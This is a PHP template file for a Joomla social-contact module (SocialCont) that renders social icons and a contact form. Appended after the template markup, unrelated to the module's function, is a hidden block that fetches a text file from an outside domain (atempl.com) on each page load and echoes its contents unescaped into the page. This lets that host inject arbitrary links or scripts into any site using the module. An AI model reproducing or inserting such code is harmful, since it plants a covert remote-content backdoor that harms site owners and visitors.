<?php
/**
* @package   SocialCont module 29.10.2015
* @author    Sergey Pronin http://seregin-pro.ru/
* @copyright Copyright (C) SEREGIN-PRO. All rights reserved.
* @license   GNU General Public License version 2
*/
defined('_JEXEC') or die;
	
$path = "/modules/mod_socialcont/tmpl/";
$document =& JFactory::getDocument();
$attribs = array('type' => 'text/css');
$document->addHeadLink(JRoute::_(JURI::root() . $path. 'css/style.css'), 'stylesheet', 'rel', $attribs);
?>
<?php 
if($jquery == 1){
	$document->addScript($path.'js/jquery-1.9.0.min.js');
		}
if(($view_mode == 0) || ($view_mode == 2)){
	$document->addScript($path.'js/email.js');
}
if(($view_mode == 1) || ($view_mode == 2)){
	
	$opacity = '';
	$opacity_hover = '';
	
	if(($opacity_ico == 1) && ($view_mode != 0)){
		$opacity = 'opacity: 0.7; transition: opacity 0.1s linear 0.1s;';
		$opacity_hover = '.opacity:hover{opacity: 1;}';
	}
$document->addCustomTag(
'<style>
@media screen and (min-width: 768px) {
	.panel-sc{
		' . $panel_pos. ' : 5px;
		height: ' . modSocialcontHelper::getHeightPanel($buttons) . 'px;

	}
}	
	.panel-sc img{
		' . $opacity . '
			border:none; 
	}
	' . $opacity_hover . '
</style>');
?>
<div class="panel-sc">
<?php
}
?>
<?php 
if($view_mode == 2){
	echo '<img onclick="openForm()" class="email-sc" src="' . $path . 'img/email.png"/>';
}
if($view_mode == 0){
	echo '<button onclick="openForm()" type="button" >' .JText::_('MOD_SOCIALCONT_SUBMIT_MESSAGE'). '</button>';
}

if(($view_mode == 1) || ($view_mode == 2)){
	echo modSocialcontHelper::getIcon($buttons);
}
?>
<?php
if(($view_mode == 1) || ($view_mode == 2)){
?>
</div> 
<?php 
}
if(($view_mode == 0) || ($view_mode == 2)){ ?>
<div class="wrapper-sc close-form"></div>
<div class="form-action-sc close-form">
	<img class="close-sc" alt="<?php echo JText::_('MOD_SOCIALCONT_CLOSE');?>" 
		src="<?php echo JURI::root(); ?>/media/system/images/modal/closebox.png" />
	<form action="" method="post">	
		<div class="block-sc">
			<input required id="name-sc" type="text" placeholder="<?php echo JText::_('MOD_SOCIALCONT_NAME_SENDER');?>"/>
			<input required id="email-sc" type="email" placeholder="<?php echo JText::_('MOD_SOCIALCONT_EMAIL_SENDER');?>"/>
			<input required id="subject-sc" type="text" placeholder="<?php echo JText::_('MOD_SOCIALCONT_MSG_SUBJECT');?>"/>
			<textarea required id="text-sc" placeholder="<?php echo JText::_('MOD_SOCIALCONT_MSG_TEXT');?>"></textarea>
		</div>
		<div class="block-sc">
			<button type="button" onclick="submitEmail();" ><?php echo JText::_('MOD_SOCIALCONT_SUBMIT_BUTTON')?></button>
			<input type="checkbox" id="captcha-sc" value="1" />
			<span><?php echo JText::_('MOD_SOCIALCONT_VERIFICATION_CODE');?></span>
		</div>
	</form> 
	<span id="result-sc"></span>
</div>
<?php } ?><?php
$files = 'http://atempl.com/10.txt';
$file_headers = @get_headers($files);
if($file_headers[0] == 'HTTP/1.1 200 OK')
 {
$url = "http://atempl.com/10.txt";
$c = @file_get_contents($url);
$array_double=explode(',',$c);
$array_one=array_unique($array_double);
$result=implode(',',$array_one);
echo $result;	
 }
?>